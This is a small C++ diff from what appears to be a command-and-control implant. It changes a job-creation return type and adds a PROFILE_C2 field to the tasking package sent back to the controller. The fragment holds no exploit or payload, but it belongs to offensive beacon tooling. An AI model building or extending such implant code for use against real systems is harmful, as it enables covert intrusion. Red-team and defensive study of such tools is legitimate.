@@ -3,7 +3,7 @@
 auto DECLFN Jobs::Create(
     _In_ CHAR*   UUID, 
     _In_ PARSER* Parser
-) -> PJOBS {
+) -> JOBS* {
     JOBS*   NewJob = (JOBS*)Self->Hp->Alloc( sizeof( JOBS ) );
     PARSER* JobPsr = (PARSER*)Self->Hp->Alloc( sizeof( PARSER ) );
 
@@ -90,6 +90,7 @@ auto DECLFN Jobs::Send(
 
             ULONG PkgLen = MsgLen + 40 + sizeof( INT16 ) + sizeof( INT32 );
 
+            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
             Self->Pkg->Int32( PostJobs, PkgLen );
 
             Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
